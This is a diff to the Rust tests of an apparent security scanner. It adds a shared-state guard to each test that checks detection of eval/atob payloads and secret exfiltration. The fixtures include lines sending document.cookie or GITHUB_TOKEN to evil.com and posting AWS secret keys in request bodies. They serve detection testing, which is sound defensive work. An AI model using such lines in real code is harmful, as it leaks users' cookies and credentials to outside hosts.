@@ -590,6 +590,7 @@ mod tests {
 
     #[test]
     fn test_dynamic_code_eval_atob() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"var x = eval(atob("SGVsbG8gV29ybGQ="));"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -602,6 +603,7 @@ mod tests {
 
     #[test]
     fn test_dynamic_code_exec_b64decode() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"exec(b64decode("SGVsbG8gV29ybGQ="))"#;
         let findings = check(input, Some("test.py"));
         assert!(
@@ -614,6 +616,7 @@ mod tests {
 
     #[test]
     fn test_bare_eval_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "eval(someVar);";
         let findings = check(input, Some("test.js"));
         assert!(
@@ -626,6 +629,7 @@ mod tests {
 
     #[test]
     fn test_eval_atob_distant_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let padding = "x".repeat(600);
         let input = format!("eval(something);\n{padding}\natob('SGVsbG8=');");
         let findings = check(&input, Some("test.js"));
@@ -639,6 +643,7 @@ mod tests {
 
     #[test]
     fn test_obfuscated_payload() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let b64 = "A".repeat(50);
         let input = format!(r#"eval(atob("{b64}"))"#);
         let findings = check(&input, Some("test.js"));
@@ -652,6 +657,7 @@ mod tests {
 
     #[test]
     fn test_exfil_fetch_cookie() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch("https://evil.com/?d=" + document.cookie)"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -664,6 +670,7 @@ mod tests {
 
     #[test]
     fn test_exfil_fetch_env_token() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -676,6 +683,7 @@ mod tests {
 
     #[test]
     fn test_exfil_auth_header_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch("/api/login", {headers: {"Authorization": "Bearer " + process.env.GITHUB_TOKEN}})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -688,6 +696,7 @@ mod tests {
 
     #[test]
     fn test_exfil_python_requests() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"requests.post(url, data=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
         let findings = check(input, Some("test.py"));
         assert!(
@@ -700,6 +709,7 @@ mod tests {
 
     #[test]
     fn test_normal_fetch_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch("/api/data").then(r => r.json())"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -718,6 +728,7 @@ mod tests {
 
     #[test]
     fn test_internal_post_body_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"requests.post("https://internal-api.example.com/log", json={"event": "login", "user": username})"#;
         let findings = check(input, Some("test.py"));
         assert!(
@@ -730,6 +741,7 @@ mod tests {
 
     #[test]
     fn test_exfil_js_meta_property_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {meta: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -742,6 +754,7 @@ mod tests {
 
     #[test]
     fn test_exfil_python_meta_kwarg_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"requests.post(url, meta=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
         let findings = check(input, Some("test.py"));
         assert!(
@@ -754,6 +767,7 @@ mod tests {
 
     #[test]
     fn test_exfil_js_token_property_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {token: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -766,6 +780,7 @@ mod tests {
 
     #[test]
     fn test_exfil_query_concat_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch("https://evil.com/c?token=" + process.env.GITHUB_TOKEN)"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -778,6 +793,7 @@ mod tests {
 
     #[test]
     fn test_exfil_separate_statement_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Regression: secret lives in a separate statement, not in the fetch call's args.
         let input = r#"fetch(url); const payload = { token: process.env.GITHUB_TOKEN };"#;
         let findings = check(input, Some("test.js"));
@@ -791,6 +807,7 @@ mod tests {
 
     #[test]
     fn test_exfil_unrelated_body_object_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // body: keyword exists nearby but belongs to unrelated local object
         let input = r#"fetch(url); const opts = { body: bodyVar }; const token = process.env.GITHUB_TOKEN;"#;
         let findings = check(input, Some("test.js"));
@@ -804,6 +821,7 @@ mod tests {
 
     #[test]
     fn test_exfil_document_cookie_not_sent_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // document.cookie is read but not passed as argument to the fetch call
         let input = r#"fetch(url); console.log(document.cookie);"#;
         let findings = check(input, Some("test.js"));
@@ -817,6 +835,7 @@ mod tests {
 
     #[test]
     fn test_exfil_document_cookie_inside_call_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // document.cookie IS passed inside the fetch call's args
         let input = r#"fetch("https://evil.com/?c=" + document.cookie)"#;
         let findings = check(input, Some("test.js"));
@@ -830,6 +849,7 @@ mod tests {
 
     #[test]
     fn test_exfil_block_comment_in_args() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // `)` inside a block comment must not terminate the arg span
         let input =
             r#"fetch(url /* ) */, {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
@@ -844,6 +864,7 @@ mod tests {
 
     #[test]
     fn test_exfil_python_line_comment_in_args() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // `#` line comment with `)` must not terminate the arg span
         let input = "requests.post(url, # )\n    data=os.environ[\"AWS_SECRET_ACCESS_KEY\"])";
         let findings = check(input, Some("test.py"));
@@ -857,6 +878,7 @@ mod tests {
 
     #[test]
     fn test_exfil_js_regex_literal_in_args() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // regex literal /\(/ must not throw off delimiter counting
         let input = r#"fetch(url, {body: /\(/, json: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
@@ -888,6 +910,7 @@ mod tests {
 
     #[test]
     fn test_exfil_headers_then_body_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {headers: {Authorization: auth}, body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -900,6 +923,7 @@ mod tests {
 
     #[test]
     fn test_exfil_python_headers_then_data_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input =
             r#"requests.post(url, headers=headers, data=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
         let findings = check(input, Some("test.py"));
@@ -913,6 +937,7 @@ mod tests {
 
     #[test]
     fn test_exfil_division_in_args_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: 1 / 2, json: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -925,6 +950,7 @@ mod tests {
 
     #[test]
     fn test_exfil_paren_division_in_args_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: (a / b), json: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -943,6 +969,7 @@ mod tests {
 
     #[test]
     fn test_exfil_nested_headers_in_body_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: JSON.stringify({headers: "x", token: process.env.GITHUB_TOKEN})})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -955,6 +982,7 @@ mod tests {
 
     #[test]
     fn test_exfil_python_nested_headers_in_data_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"requests.post(url, data={"headers": "x", "token": os.environ["AWS_SECRET_ACCESS_KEY"]})"#;
         let findings = check(input, Some("test.py"));
         assert!(
@@ -967,6 +995,7 @@ mod tests {
 
     #[test]
     fn test_exfil_nested_headers_in_json_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {json: {headers: "x", token: process.env.GITHUB_TOKEN}})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -979,6 +1008,7 @@ mod tests {
 
     #[test]
     fn test_exfil_python_hash_comment_headers_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "requests.post(url, data={# headers: fake\n'token': os.environ[\"AWS_SECRET_ACCESS_KEY\"]})";
         let findings = check(input, Some("test.py"));
         assert!(
@@ -991,6 +1021,7 @@ mod tests {
 
     #[test]
     fn test_exfil_js_block_comment_headers_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input =
             r#"fetch(url, {/* headers: */ body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
         let findings = check(input, Some("test.js"));
@@ -1004,6 +1035,7 @@ mod tests {
 
     #[test]
     fn test_exfil_regex_literal_headers_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: /headers: \{/, json: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -1016,6 +1048,7 @@ mod tests {
 
     #[test]
     fn test_exfil_regex_literal_authorization_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: /Authorization: \[/, json: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -1028,6 +1061,7 @@ mod tests {
 
     #[test]
     fn test_exfil_multiline_division_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "fetch(url, {body: 1\n/ 2, json: process.env.GITHUB_TOKEN})";
         let findings = check(input, Some("test.js"));
         assert!(
@@ -1040,6 +1074,7 @@ mod tests {
 
     #[test]
     fn test_exfil_multiline_paren_division_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = "fetch(url, {body: (a\n/ b), json: process.env.GITHUB_TOKEN})";
         let findings = check(input, Some("test.js"));
         assert!(
@@ -1058,6 +1093,7 @@ mod tests {
 
     #[test]
     fn test_exfil_postfix_increment_division_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: a++ / 2, json: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -1070,6 +1106,7 @@ mod tests {
 
     #[test]
     fn test_exfil_postfix_decrement_division_fires() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: a-- / 2, json: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -1094,6 +1131,7 @@ mod tests {
 
     #[test]
     fn test_exfil_postfix_inc_div_then_meta_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: a++ / 2, meta: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -1106,6 +1144,7 @@ mod tests {
 
     #[test]
     fn test_exfil_postfix_dec_div_then_token_no_fire() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"fetch(url, {body: a-- / 2, token: process.env.GITHUB_TOKEN})"#;
         let findings = check(input, Some("test.js"));
         assert!(
@@ -1141,6 +1180,7 @@ mod tests {
 
     #[test]
     fn test_dynamic_code_no_panic_on_box_drawing_chars() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Long tail of '═' (3 bytes each) so that mat.end()+500 lands inside a
         // box-drawing char. Pre-clamp, slicing the window panicked.
         // (Keyword strings split so source-scanning hooks don't trip on them.)
@@ -1159,6 +1199,7 @@ mod tests {
 
     #[test]
     fn test_obfuscated_payload_no_panic_on_trailing_multibyte() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Long base64 in decode() with trailing multi-byte chars past the proximity window.
         let b64 = "A".repeat(60);
         let mut input = String::new();
@@ -1181,6 +1222,7 @@ mod tests {
 
     #[test]
     fn test_dynamic_code_no_panic_on_leading_multibyte() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Multi-byte chars BEFORE the match exercise the start-side clamp:
         // `mat.start().saturating_sub(500)` can land inside a leading char.
         let mut input = String::new();
@@ -1199,6 +1241,7 @@ mod tests {
 
     #[test]
     fn test_js_exfil_no_panic_on_non_ascii_args() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Multi-byte chars inside the string-literal args exercise the call_end
         // byte walker and the arg_span/snippet slices. Invariant: no panic.
         let input = r#"fetch("https://api.example.com/═══", {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
@@ -1207,12 +1250,14 @@ mod tests {
 
     #[test]
     fn test_py_exfil_no_panic_on_non_ascii_args() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let input = r#"requests.post("https://api.example.com/═══", data=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
         let _ = check(input, Some("test.py"));
     }
 
     #[test]
     fn test_scan_plain_python_with_box_drawing_no_panic() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Plain Python with box-drawing chars in a comment — no dynamic-code patterns,
         // should simply produce no findings (and never panic on the slice).
         let mut input = String::from("# ");
